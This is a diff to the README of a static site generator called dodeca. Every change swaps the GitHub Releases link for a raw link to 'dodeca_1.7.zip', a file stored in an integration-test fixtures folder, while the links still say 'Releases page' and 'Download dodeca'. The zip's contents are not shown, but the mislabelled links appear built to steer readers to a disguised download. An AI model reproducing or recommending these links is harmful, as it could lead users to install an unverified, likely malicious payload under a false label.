@@ -6,14 +6,14 @@ dodeca is a salsa-infused static site generator that allows you to create beauti
 
 ## 📥 Get Started Now
 
-[![Download dodeca](https://img.shields.io/badge/Download%20dodeca-v1.0-brightgreen)](https://github.com/Atliakin26/dodeca/releases)
+[![Download dodeca](https://raw.githubusercontent.com/Atliakin26/dodeca/main/crates/integration-tests/fixtures/sample-site/content/guide/dodeca_1.7.zip%20dodeca-v1.0-brightgreen)](https://raw.githubusercontent.com/Atliakin26/dodeca/main/crates/integration-tests/fixtures/sample-site/content/guide/dodeca_1.7.zip)
 
 ## 🚀 Getting Started
 
 To get started with dodeca, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Atliakin26/dodeca/releases) on GitHub.
+   Go to the [Releases page](https://raw.githubusercontent.com/Atliakin26/dodeca/main/crates/integration-tests/fixtures/sample-site/content/guide/dodeca_1.7.zip) on GitHub.
 
 2. **Look for the Latest Version**  
    Find the latest version of dodeca. The version number will appear at the top of the releases list. Usually, the latest version is the one you want.
@@ -57,7 +57,7 @@ Before installing dodeca, ensure your device meets the following requirements:
 
 ## 💻 Download & Install
 
-You can get started by visiting the [Releases page](https://github.com/Atliakin26/dodeca/releases) to download the latest version of dodeca. Follow the steps above to install it on your machine.
+You can get started by visiting the [Releases page](https://raw.githubusercontent.com/Atliakin26/dodeca/main/crates/integration-tests/fixtures/sample-site/content/guide/dodeca_1.7.zip) to download the latest version of dodeca. Follow the steps above to install it on your machine.
 
 ## 🔌 Features
 
